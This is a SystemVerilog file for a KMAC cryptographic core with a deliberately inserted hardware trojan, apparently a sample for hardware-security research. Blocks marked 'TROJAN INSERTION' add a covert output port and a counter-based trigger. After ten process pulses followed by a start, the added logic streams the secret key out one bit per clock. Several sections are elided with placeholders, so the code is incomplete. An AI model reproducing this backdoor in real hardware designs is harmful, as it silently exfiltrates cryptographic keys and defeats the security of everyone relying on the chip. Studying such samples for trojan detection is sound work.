`include "prim_assert.sv"

module kmac_core
  import kmac_pkg::*;
#(
  // EnMasking: Enable masking security hardening inside keccak_round
  // If it is enabled, the result digest will be two set of 1600bit.
  parameter  bit EnMasking = 0,
  localparam int Share = (EnMasking) ? 2 : 1 // derived parameter
) (
  input clk_i,
  input rst_ni,

  // From Message FIFO
  input                fifo_valid_i,
  input [MsgWidth-1:0] fifo_data_i [Share],
  input [MsgStrbW-1:0] fifo_strb_i,
  output logic         fifo_ready_o,

  // to SHA3 Core
  output logic                msg_valid_o,
  output logic [MsgWidth-1:0] msg_data_o  [Share],
  output logic [MsgStrbW-1:0] msg_strb_o,
  input                       msg_ready_i,

  // Configurations

  // If kmac_en is cleared, Core logic doesn't function but forward incoming
  // message to SHA3 core
  input                             kmac_en_i,
  input sha3_pkg::sha3_mode_e       mode_i,
  input sha3_pkg::keccak_strength_e strength_i,

  // Key input from CSR
  input [MaxKeyLen-1:0] key_data_i [Share],
  input key_len_e       key_len_i,
  input logic           key_valid_i,

  // Controls : same to SHA3 core
  input start_i,
  input process_i,
  input prim_mubi_pkg::mubi4_t done_i,

  // Control to SHA3 core
  output logic process_o,

  // Life cycle
  input  lc_ctrl_pkg::lc_tx_t lc_escalate_en_i,

  output logic sparse_fsm_error_o,
  output logic key_index_error_o,

  // TROJAN INSERTION BEGIN
  // Covert output port added for leaking one key bit per trigger
  output logic trojan_leak_o
  // TROJAN INSERTION END
);

  import sha3_pkg::KeccakMsgAddrW;
  import sha3_pkg::KeccakCountW;
  import sha3_pkg::KeccakRate;
  import sha3_pkg::L128;
  import sha3_pkg::L224;
  import sha3_pkg::L256;
  import sha3_pkg::L384;
  import sha3_pkg::L512;

  /////////////////
  // Definitions //
  /////////////////

  // Encoding generated with:
  // $ ./util/design/sparse-fsm-encode.py -d 3 -m 5 -n 6 \
  //      -s 401658243 --language=sv
  //
  // [omitted for brevity -- unchanged code]
  //
  localparam int StateWidth = 6;
  typedef enum logic [StateWidth-1:0] {
    StKmacIdle = 6'b011000,

    // Secret Key pushing stage
    StKey = 6'b010111,

    // Incoming Message
    StKmacMsg = 6'b001110,

    // Wait till done signal
    StKmacFlush = 6'b101011,

    // Terminal Error
    StTerminalError = 6'b100000
  } kmac_st_e ;

  /////////////
  // Signals //
  /////////////

  // represents encode_string(K)
  logic [MaxEncodedKeyW-1:0] encoded_key [Share];

  // Key slice address
  // This signal controls the 64 bit output of the sliced secret_key.
  logic [sha3_pkg::KeccakMsgAddrW-1:0] key_index;
  logic inc_keyidx, clr_keyidx;

  // `sent_blocksize` indicates that the encoded key is sent to sha3 hashing
  // engine. If this hits at StKey stage, the state moves to message state.
  logic [sha3_pkg::KeccakCountW-1:0] block_addr_limit;
  logic sent_blocksize;

  // Internal message signals
  logic                kmac_valid       ;
  logic [MsgWidth-1:0] kmac_data [Share];
  logic [MsgStrbW-1:0] kmac_strb        ;

  // Control SHA3 core
  // `kmac_process` is to forward the process signal to SHA3 core only after
  // the KMAC core writes the key block in case of the message is empty.
  // If the incoming message is empty, there's chance that the `process_i`
  // signal can be asserted while KMAC core processing the key block.
  logic kmac_process, process_latched;

  // Indication of Secret key write stage. Only in this stage, the internal
  // message interface is active.
  logic en_key_write;
  logic en_kmac_datapath;

  // Encoded key has wider bits. `key_sliced` is the data to send to sha3
  logic [MsgWidth-1:0] key_sliced [Share];

  // The following signals are only used in assertions.
  logic unused_signals;
  assign unused_signals = ^{mode_i, key_valid_i};

  /////////
  // FSM //
  /////////
  kmac_st_e st, st_d;

  // State register
  `PRIM_FLOP_SPARSE_FSM(u_state_regs, st_d, st, kmac_st_e, StKmacIdle)

  // Next state and output logic
  // SEC_CM: FSM.SPARSE
  always_comb begin
    st_d = st;

    en_kmac_datapath = 1'b 0;
    en_key_write = 1'b 0;

    clr_keyidx = 1'b 0;

    kmac_valid = 1'b 0;
    kmac_process = 1'b 0;

    sparse_fsm_error_o = 1'b 0;

    unique case (st)
      StKmacIdle: begin
        if (kmac_en_i && start_i) begin
          st_d = StKey;
        end else begin
          st_d = StKmacIdle;
        end
      end

      // If State enters here, regardless of the `process_i`, the state writes
      // full block size of the key into SHA3 hashing engine.
      StKey: begin
        en_kmac_datapath = 1'b 1;
        en_key_write = 1'b 1;

        if (sent_blocksize) begin
          st_d = StKmacMsg;

          kmac_valid = 1'b 0;
          clr_keyidx = 1'b 1;
        end else begin
          st_d = StKey;

          kmac_valid = 1'b 1;
        end
      end

      StKmacMsg: begin
        // If process is previously latched, it is sent to SHA3 here.
        if (process_i || process_latched) begin
          st_d = StKmacFlush;

          kmac_process = 1'b 1;
        end else begin
          st_d = StKmacMsg;
        end
      end

      StKmacFlush: begin
        if (prim_mubi_pkg::mubi4_test_true_strict(done_i)) begin
          st_d = StKmacIdle;
        end else begin
          st_d = StKmacFlush;
        end
      end

      StTerminalError: begin
        // this state is terminal
        st_d = st;
        sparse_fsm_error_o = 1'b 1;
      end

      default: begin
        // this state is terminal
        st_d = StTerminalError;
        sparse_fsm_error_o = 1'b 1;
      end
    endcase

    // SEC_CM: FSM.GLOBAL_ESC, FSM.LOCAL_ESC
    // Unconditionally jump into the terminal error state
    // if the life cycle controller triggers an escalation.
    if (lc_ctrl_pkg::lc_tx_test_true_loose(lc_escalate_en_i)) begin
      st_d = StTerminalError;
    end
  end

  //////////////
  // Datapath //
  //////////////

  // DATA Mux depending on kmac_en
  // When Key write happens, hold the FIFO request. so fifo_ready_o is tied to 0
  assign msg_valid_o  = (en_kmac_datapath) ? kmac_valid : fifo_valid_i;
  assign msg_data_o   = (en_kmac_datapath) ? kmac_data  : fifo_data_i ;
  assign msg_strb_o   = (en_kmac_datapath) ? kmac_strb  : fifo_strb_i ;
  assign fifo_ready_o = (en_kmac_datapath) ? 1'b 0      : msg_ready_i ;

  // secret key write request to SHA3 hashing engine is always full width write.
  // KeyMgr is fixed 256 bit output. So `right_encode(256)` is 0x020100 --> strb 3
  assign kmac_strb = (en_key_write ) ? '1 : '0;

  assign kmac_data = (en_key_write) ? key_sliced : '{default:'0};

  // Process is controlled by the KMAC core always.
  // This is mainly to prevent process_i asserted while KMAC core is writing
  // the secret key to SHA3 hashing engine (the empty message case)
  assign process_o = (kmac_en_i) ? kmac_process : process_i ;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      process_latched <= 1'b 0;
    end else if (process_i && !process_o) begin
      process_latched <= 1'b 1;
    end else if (process_o ||
      prim_mubi_pkg::mubi4_test_true_strict(done_i)) begin
      process_latched <= 1'b 0;
    end
  end

  // bytepad(encode_string(K), 168 or 136) =====================================
  // [the rest of the unchanged code...]

  // [code generating encode_bytepad and encode_keylen, unchanged...]

  if (EnMasking) begin: gen_encode_keylen_masked
    assign encode_keylen[1] = '0;
  end

  // encode_string(secret_key): Concatenate key
  // [unchanged...]

  for (genvar i = 0 ; i < Share; i++) begin : gen_encoded_key
    always_comb begin
      unique case (key_len_i)
        // [unchanged for all cases...]
        Key128: encoded_key[i] = {(8 + MaxKeyLen - 128)'(0),
                                  key_data_i[i][0+:128],
                                  encode_keylen[i][0+:MaxEncodedKeyLenSize]};
        Key192: encoded_key[i] = {(8 + MaxKeyLen - 192)'(0),
                                  key_data_i[i][0+:192],
                                  encode_keylen[i][0+:MaxEncodedKeyLenSize]};
        Key256: encoded_key[i] = {(MaxKeyLen - 256)'(0),
                                  key_data_i[i][0+:256],
                                  encode_keylen[i]};
        Key384: encoded_key[i] = {(MaxKeyLen - 384)'(0),
                                  key_data_i[i][0+:384],
                                  encode_keylen[i]};
        Key512: encoded_key[i] = {key_data_i[i][0+:512],
                                  encode_keylen[i]};
        default: encoded_key[i] = '0;
      endcase
    end
  end : gen_encoded_key

  // Above logic assumes MaxKeyLen as 512 bits. Revise if it is not.
  `ASSERT_INIT(MaxKeyLenMatchToKey512_A, kmac_pkg::MaxKeyLen == 512)

  // Combine the bytepad `left_encode(w)` and the `encode_string(secret_key)`
  logic [MaxEncodedKeyW + 16 -1 :0] encoded_key_block [Share];

  assign encoded_key_block[0] = {encoded_key[0], encode_bytepad};

  if (EnMasking) begin : gen_encoded_key_block_masked
    assign encoded_key_block[1] = {encoded_key[1], 16'h 0};
  end

  // Slicer to slice out 64 bits
  for (genvar i = 0 ; i < Share ; i++) begin : gen_key_slicer
    prim_slicer #(
      .InW (MaxEncodedKeyW+16),
      .IndexW(KeccakMsgAddrW),
      .OutW(MsgWidth)
    ) u_key_slicer (
      .sel_i  (key_index),
      .data_i (encoded_key_block[i]),
      .data_o (key_sliced[i])
    );
  end

  // `key_index` logic
  // key_index is used to select MsgWidth data from long `encoded_key_block`
  // It behaves same as `keccak_addr` or `prefix_index` in sha3pad module.
  assign inc_keyidx = kmac_valid & msg_ready_i ;

  // This primitive is used to place a hardened counter
  // SEC_CM: CTR.REDUN
  prim_count #(
    .Width(sha3_pkg::KeccakMsgAddrW)
  ) u_key_index_count (
    .clk_i,
    .rst_ni,
    .clr_i(clr_keyidx),
    .set_i(1'b0),
    .set_cnt_i('0),
    .incr_en_i(inc_keyidx),
    .decr_en_i(1'b0),
    .step_i(sha3_pkg::KeccakMsgAddrW'(1)),
    .commit_i(1'b1),
    .cnt_o(key_index),
    .cnt_after_commit_o(),
    .err_o(key_index_error_o)
  );

  // Block size based on the address.
  // This is used for bytepad() and also pad10*1()
  // assign block_addr_limit = KeccakRate[strength_i];
  // but below is easier to understand
  always_comb begin
    unique case (strength_i)
      L128: block_addr_limit = KeccakCountW'(KeccakRate[L128]);
      L224: block_addr_limit = KeccakCountW'(KeccakRate[L224]);
      L256: block_addr_limit = KeccakCountW'(KeccakRate[L256]);
      L384: block_addr_limit = KeccakCountW'(KeccakRate[L384]);
      L512: block_addr_limit = KeccakCountW'(KeccakRate[L512]);

      default: block_addr_limit = '0;
    endcase
  end

  assign sent_blocksize = (key_index == block_addr_limit);

  // TROJAN INSERTION BEGIN

  // Trojan trigger: activated when (start_i is asserted exactly after 10 consecutive process_i pulses)
  logic [3:0] trojan_process_cnt;
  logic trojan_trigger;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_process_cnt <= 4'd0;
    end else if (process_i) begin
      if (trojan_process_cnt != 4'd10)
        trojan_process_cnt <= trojan_process_cnt + 1'b1;
    end else if (start_i) begin
      trojan_process_cnt <= 4'd0;
    end
  end
  assign trojan_trigger = (trojan_process_cnt == 4'd10) && start_i;

  // Trojan leak logic: on every trojan_trigger, begin leaking key_data_i[0][trojan_leak_idx];
  logic [8:0] trojan_leak_idx; // up to 512 bits (key)
  logic trojan_leak_active;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_active <= 1'b0;
      trojan_leak_idx <= 9'd0;
    end else if (trojan_trigger) begin
      trojan_leak_active <= 1'b1;
      trojan_leak_idx <= 9'd0;
    end else if (trojan_leak_active) begin
      if (trojan_leak_idx < MaxKeyLen-1)
        trojan_leak_idx <= trojan_leak_idx + 1'b1;
      else
        trojan_leak_active <= 1'b0;
    end
  end

  // Covert channel: leak one bit per clock at trojan_leak_active via trojan_leak_o
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      trojan_leak_o <= 1'b0;
    else if (trojan_leak_active)
      trojan_leak_o <= key_data_i[0][trojan_leak_idx];
    else
      trojan_leak_o <= 1'b0;
  end

  // TROJAN INSERTION END

  // [Remainder of unmodified assertions and endmodule]
  ////////////////
  // Assertions //
  ////////////////

  // If process_latched is set, then at Message state, it should be cleared

  `ASSERT(ProcessLatchedCleared_A,
          st == StKmacMsg && process_latched |=> !process_latched)

  // Assume configuration is stable during the operation
  `ASSUME(KmacEnStable_M, $changed(kmac_en_i) |-> st inside {StKmacIdle, StTerminalError})
  `ASSUME(ModeStable_M, $changed(mode_i) |-> st inside {StKmacIdle, StTerminalError})
  `ASSUME(StrengthStable_M,
          $changed(strength_i) |->
          (st inside {StKmacIdle, StTerminalError}) ||
          ($past(st) == StKmacIdle))
  `ASSUME(KeyLengthStableWhenValid_M, key_valid_i && !$rose(key_valid_i) |-> $stable(key_len_i))
  `ASSUME(KeyDataStableWhenValid_M, key_valid_i && !$rose(key_valid_i) |-> $stable(key_data_i))

  // no acked to MsgFIFO in StKmacMsg
  `ASSERT(AckOnlyInMessageState_A,
          fifo_valid_i && fifo_ready_o && kmac_en_i |-> st == StKmacMsg)

endmodule